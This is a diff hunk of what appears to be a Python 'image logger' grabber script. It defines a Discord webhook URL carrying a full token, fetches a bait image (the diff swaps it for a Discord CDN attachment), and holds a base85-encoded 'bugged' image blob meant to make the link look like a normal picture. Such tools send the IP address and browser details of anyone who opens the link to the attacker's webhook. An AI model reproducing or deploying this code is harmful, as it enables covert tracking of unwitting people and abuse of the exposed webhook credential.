@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1487935322766577826/qR4qsp5VLw-TP8og5T2VfwAGeS7YkpDFP73D0tH33V3Vyazu9P5VPIcwEJFDOyaPF_bR'
 
-bindata = httpx.get('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyOnpln-YaRi-maL_UHOgcUYXrnr6RZPMMlw&s').content
+bindata = httpx.get('https://cdn.discordapp.com/attachments/1487623148089114667/1487623253567475773/Captura_de_tela_2026-03-28_220205.png?ex=69ca795e&is=69c927de&hm=9d142309979cb4f447c6d8235eae285cea022e5a2c20d13a66db9e1fa296e2c8').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
